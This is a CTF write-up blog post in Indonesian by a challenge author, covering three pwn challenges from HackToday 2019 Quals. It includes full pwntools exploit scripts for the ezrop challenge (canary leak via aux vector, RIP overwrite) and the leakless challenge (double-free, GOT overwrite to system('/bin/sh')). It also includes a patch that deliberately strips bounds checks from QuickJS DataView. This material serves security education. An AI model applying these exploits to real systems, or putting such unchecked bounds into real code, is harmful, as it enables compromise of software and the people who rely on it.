---
title: "HackToday 2019 Quals - pwn"
description: "Editorial untul soal-soal yang saya buat untuk HackToday Quals CTF 2019"
pubDate: "August 26 2019"
tags: ["ctf-writeup", "pwn"]
---

Ini akan menjadi seri ke-tiga pada seri _writeup_ HackToday 2019, kali ini saya akan menulis beberapa editorial untuk soal-soal pwn pada kualifikasi HackToday 2019.

## ezrop

Desain awal soal sebenarnya benar-benar sederhana, key value memory database system, dimana seseorang dapat melihat/mengubah isi value dari suatu key dan posisinya bisa _out-of-bound_. Yep, tanpa perubahan apapun pada isi memorynya. Tidak tahu kapan persis mulainya, tapi saya merasa soal ini terlalu mudah sehingga mengalami banyak perubahan yang membuat ini tidak benar-benar “ez”. Puncak kerumitannya, yang harus dilakukan adalah leak value canary lewat auxiliary vector[\[1\]](https://www.gnu.org/software/libc/manual/html_node/Auxiliary-Vector.html)[\[2\]](https://lwn.net/Articles/519085/) karena saya mem-_poison_ hampir semua value di memory serta pie+offset tepat pada RBP (leak PIE jadi tidak berguna disini). Beberapa hari sebelum kualifikasi dimulai, saya tersadar, ini soal “ez”, jadilah perubahan final soal ini, tanpa adanya _poison_ pada value pada RBP. Sebagai gambaran, ini yang terjadi ketika sebelum perubahan final terjadi,

    +----------+----------+
    | rand     | rand     |
    +----------+----------+
    | rand     | canary   |
    +----------+----------+
    | rand     | libc_ret |
    +----------+----------+
    | ......   | ......   |
    +----------+----------+

Kalau yang terjadi adalah seperti di atas, yang harus dilakukan adalah mendapatkan canary dari `AT_RADOM`, aux vector entry nomor 25.

```c
    #define AT_RANDOM        25                /* Address of 16 random bytes.  */
```

Yep, `AT_RANDOM` pun tidak langsung memberikan CANARY value karena ini adalah pointer ke random bytes di memory. Cara satu-satunya adalah terus menelursuri key-val chain hingga didapat CANARY-nya. Kalau dilihat lagi, `AT_RADOM` sendiri mengarah pada memory diantara auxv dan environment. Terdengar rumit, tapi _doable_ untuk soal yang straightforward seperti ini. Bagaimana pun juga, ini soal dengan nama “ez”, jadi saya langsung mengurangi tingkat ke rumitannya dengan mengubah alur program tanpa _poison_ memory pada RBP. Kalau seperti itu yang terjadi adalah seperti berikut.

    +----------+----------+
    | rand     | rand     |
    +----------+----------+
    | rand     | canary   |
    +----------+----------+
    | pie+off  | libc_ret |
    +----------+----------+
    | ......   | ......   |
    +----------+----------+

dengan begitu, hanya dengan leak pie offset melalui `AT_PHDR` (auxv 3), seharusnya sudah dapat mengontrol value saved RIP melalui key-val system ini. btw, dari semua write-up yang dikirim ke panitia, sepertinya tidak ada satu pun tim yang menyadari keberadaan aux vector disini, sad. Full solver,

```py
#!/usr/bin/env python
from pwn import *

# context.terminal = ['tmux', 'split-window', '-h']
context.log_level = ['debug', 'info', 'warn'][1]

BINARY = './challenge/ezrop'
HOST = "not.codepwnda.id"
PORT = 30000

r = tube; elf = ELF; libc = ELF

def find_canary():
    tmp = 15

    for _ in range(4):
        r.sendlineafter(': ', str(tmp))
        r.recvuntil(' = ')
        tmp = int(r.recvline(0), 16)
        r.sendlineafter(': ', 'n')
        r.sendlineafter(': ', 'n')

    r.sendlineafter(': ', str(tmp))
    r.recvuntil(' = ')
    tmp = int(r.recvline(0), 16)
    r.sendlineafter(': ', 'n')
    r.sendlineafter(': ', 'n')

    canary = tmp & 0xFFFFFFFFFFFF0000
    canary >>= 8

    r.sendlineafter(': ', str(tmp))
    r.recvuntil(' = ')
    tmp = int(r.recvline(0), 16)
    r.sendlineafter(': ', 'n')
    r.sendlineafter(': ', 'n')

    canary |= (tmp & 0xFF) << 56
    return canary


def exploit(REMOTE):

    r.sendlineafter(': ', '3')
    r.recvuntil(' = ')
    at_phdr = int(r.recvline(0), 16)
    r.sendlineafter(': ', 'n')
    r.sendlineafter(': ', 'n')

    elf.address = at_phdr - 0x40

    info('AT_PHDR %X' % (at_phdr))
    info('PIE_BASE %X' % (elf.address))

    if not REMOTE: gdb.attach(r, 'b *{}'.format(elf.address + 0xd40))
    canary = find_canary()
    info('CANARY %X' % (canary))

    r.sendlineafter(': ', str(canary))
    r.recvuntil(' = ')
    tmp = int(r.recvline(0), 16)
    r.sendlineafter(': ', 'n')
    r.sendlineafter(': ', 'n')

    r.sendlineafter(': ', str(tmp))
    r.recvuntil(' = ')
    libc_start_main_ret = int(r.recvline(0), 16)
    r.sendlineafter(': ', 'n')
    r.sendlineafter(': ', 'n')

    info('LIBC_START_MAIN_RET %X' % (libc_start_main_ret))
    libc.address = ((libc_start_main_ret - libc.sym['__libc_start_main']) & 0xFFFFFFFFFFFFF000) + libc.address
    info('LIBC_BASE %X' % (libc.address))

    # ROP ALL THE WAY DOWN
    r.sendlineafter(': ', str(tmp))
    r.sendlineafter(': ', 'y')
    r.sendlineafter(': ', str(elf.sym['flag']))
    r.sendlineafter(': ', 'y')

if __name__ == '__main__':
    REMOTE = os.getenv('REMOTE')
    elf = ELF(BINARY, checksec=False)

    if REMOTE:
        r = remote(HOST, PORT)
        libc = ELF('/home/kyra/git/libc-database/db/libc6_2.23-0ubuntu10_amd64.so', checksec=False)
    else:
        r = elf.process(aslr=1)
        libc = r.libc
        info(r.pid)

    exploit(REMOTE)
    r.interactive()
```

## leakless

![leakless](/img/hacktoday-leakless.png)_a pun from IDA, no undo, no surrender._

classical heap note problem, dimana terdapat double-free tanpa ada fungsi `view()` untuk note yang dibuat. Ada beberapa cara yang dapat dilakukan untuk mengotrol RIP sehingga mendapatkan shell dan untuk mendapatkan leak. Namun dari beberapa writeup yang saya baca, hampir semua mengganti GOT table `free` ke `PLT.printf` untuk digunakan sebagai format string. Saya sendiri mengubah GOT `atoi` ke `printf`. Full solver,

```py
#!/usr/bin/env python
from pwn import *

context.terminal = ['tmux', 'split-window', '-h']
context.log_level = ['debug', 'info', 'warn'][1]

BINARY = './release/chall'
HOST = "not.codepwnda.id"
PORT = 30001

r = tube; elf = ELF; libc = ELF

def create(size, msg, edited=False):
    r.sendafter('> ', '1' if not edited else ' \x00')
    r.sendafter(': ', str(size) if not edited else '%{}c\x00'.format(size))
    r.sendafter(': ', str(msg))

def delete(edited=False):
    r.sendafter('> ', '2' if not edited else '  \x00')

def exploit(REMOTE):
    create(0x38, '/bin/sh')
    create(0x18, 'B' * 0x18)
    delete()
    delete()
    create(0x18, p64(elf.got['atoi']))
    create(0x18, p8(0x00))
    create(0x18, p64(elf.plt['printf']))

    payload = '%19$p'
    r.sendlineafter('> ', payload)
    libc.address = (int(r.recvline(False), 16) - libc.sym['__libc_start_main']) & 0xFFFFFFFFFFFFF000
    info('%x' % libc.address)

    create(0x28, 'C' * 0x28, 1)
    delete(1)
    delete(1)
    create(0x28, p64(elf.got['atoi']), 1)
    create(0x28, p64(0x00), 1)
    create(0x28, p64(libc.sym['system']), 1)

    r.sendafter('> ', '/bin/sh\x00')

if __name__ == '__main__':
    REMOTE = os.getenv('REMOTE')
    elf = ELF(BINARY, checksec=False)


    if REMOTE:
        libc = ELF('libc-2.27.so', checksec=False)
        r = remote(HOST, PORT)
    else:
        libc = ELF('/opt/glibc/x64/2.26/lib/libc.so.6', checksec=False)
        r = elf.process(aslr=True)

    exploit(REMOTE)
    r.interactive()
```

## quickie

Awalnya soal terakhir pwn untuk kualifikasi ini menyangkut hal JIT type confusion pada WebKit, mengikuti LiveOverflow hype pada seriesnya di YouTube, pwning WebKit. Setelah diukur waktu pengerjaannya, 6~7 jam pengerjaan untuk entry level CTF itu tidak memungkinkan. Akhirnya, mengikuti style speedrun DEF CON, saya membuat soal out-of-bound dari salah satu mini js engine yang ada. Yang saya pilih adalah [QuickJS dari Fabrice Bellard](https://bellard.org/quickjs/) karena duktape sudah lumayan banyak digunakan untuk beberapa CTF sebelumnya (DEFCON, midnight, etc.). patchset yang diberikan, `0001-QuickJS-enable-OOB.patch`,

```patch
diff --git quickjs.c quickjs.c
index 9606455..c81b450 100644
--- quickjs.c
+++ quickjs.c
@@ -47166,16 +47166,15 @@ static JSValue js_dataview_getValue(JSContext *ctx,
 {
     JSTypedArray *ta;
     JSArrayBuffer *abuf;
-    int is_swap, size;
+    int is_swap;
     uint8_t *ptr;
     uint32_t v;
-    uint64_t pos;
+    int64_t pos;

     ta = JS_GetOpaque2(ctx, this_obj, JS_CLASS_DATAVIEW);
     if (!ta)
         return JS_EXCEPTION;
-    size = 1 << typed_array_size_log2(class_id);
-    if (JS_ToIndex(ctx, &pos, argv[0]))
+    if (JS_ToInt64Sat(ctx, &pos, argv[0]))
         return JS_EXCEPTION;
     is_swap = FALSE;
     if (argc > 1)
@@ -47186,8 +47185,6 @@ static JSValue js_dataview_getValue(JSContext *ctx,
     abuf = ta->buffer->u.array_buffer;
     if (abuf->detached)
         return JS_ThrowTypeErrorDetachedArrayBuffer(ctx);
-    if ((pos + size) > ta->length)
-        return JS_ThrowRangeError(ctx, "out of bound");
     ptr = abuf->data + ta->offset + pos;

     switch(class_id) {
@@ -47269,18 +47266,17 @@ static JSValue js_dataview_setValue(JSContext *ctx,
 {
     JSTypedArray *ta;
     JSArrayBuffer *abuf;
-    int is_swap, size;
+    int is_swap;
     uint8_t *ptr;
     uint64_t v64;
     uint32_t v;
-    uint64_t pos;
+    int64_t pos;
     JSValueConst val;

     ta = JS_GetOpaque2(ctx, this_obj, JS_CLASS_DATAVIEW);
     if (!ta)
         return JS_EXCEPTION;
-    size = 1 << typed_array_size_log2(class_id);
-    if (JS_ToIndex(ctx, &pos, argv[0]))
+    if (JS_ToInt64Sat(ctx, &pos, argv[0]))
         return JS_EXCEPTION;
     val = argv[1];
     v = 0; /* avoid warning */
@@ -47321,8 +47317,6 @@ static JSValue js_dataview_setValue(JSContext *ctx,
     abuf = ta->buffer->u.array_buffer;
     if (abuf->detached)
         return JS_ThrowTypeErrorDetachedArrayBuffer(ctx);
-    if ((pos + size) > ta->length)
-        return JS_ThrowRangeError(ctx, "out of bound");
     ptr = abuf->data + ta->offset + pos;

     switch(class_id) {
```

Kalau dilihat dari sisi orang yang tidak mengetahui sama sekali codebase QuickJS, hal yang pertama dilihat adalah fungsi yang diubah, `js_dataview_getValue`, dan nama file patch mengandung OOB, dari ini bisa diambil kesimpulan bahwa terdapat OOB pada fungsi `DataView` di javascript. Sedikit test run,

```sh
λ › ./qjs --nostd
QuickJS - Type "\h" for help
qjs > let buf = new ArrayBuffer(64);
undefined
qjs > let dv = new DataView(buf);
undefined
qjs > dv.getFloat64(-1)
0
qjs > dv.getFloat64(-1000)
-4.5380154677666714e+279
```

duarr, xD. Terdapat OOB dimana seharusnya `dv.getFloat64(-1000)` mengembalikan value `undefined`, tapi `-4.5380154677666714e+279` (`0xc01226ed86db3332`). Dari yang harus dilakukan selanjutnya adalah mengubah OOB menjadi arbitrary read and write. Salah satu caranya adalah membuat “master-slave” buffer, dimana slave akan menjadi buffer yang menunjuk kepada arbitrary pointer dan master yang akan mengubah pointer pada slave buffer. Untuk mengetahui letak pointer dari slave buffer, bisa dilakukan dengan mencari unique value dari isi buffer dan memanfaatkan oob dari `DataView`, kalau sudah didapat posisi isi buffernya, bisa dilakukan kalkulasi offset relatif untuk mendapatkan pointer dari slave buffer. Stage selanjutnya setelah mendapatkan arbitrary RW adalah mengotrol RIP. Salah satu caranya adalah mengubah `__free_hook` ke one_gadget. Full solver, (belum dikasih komen sama sekali :v, `dvv` dan `dv` ini yang dimaksud dari master-slave)

### unintended solution

Kelihatannya rumit, dan ga mungkin cukup untuk lomba yang hanya 6 jam ini, tapi kok masih di rilis? Beberapa hari sebelum penyisihan dimulai, qwerty merilis [0day](http://rce.party/cracksbykim-quickJS.nfo) dari _mini competition_ yang dibuat oleh di IRC kjc. Yep, 0day ini masih berguna di soal quickie dan itu kenapa saya berani mengeluarkan soal ini meskipun waktu CTF hanya 6 jam.

```

```
